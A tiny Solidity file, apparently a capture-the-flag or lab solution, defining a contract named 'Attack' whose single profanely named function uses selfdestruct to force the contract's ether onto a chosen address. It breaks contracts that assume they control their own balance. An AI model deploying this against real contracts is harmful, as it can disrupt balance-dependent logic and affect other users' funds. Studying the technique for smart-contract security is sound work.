// SPDX-License-Identifier: UNLICENSED
pragma solidity "0.8.19";

contract Attack {
    function fuckShitUp(address payable _recipient) external payable {
        selfdestruct(_recipient);
    }
}
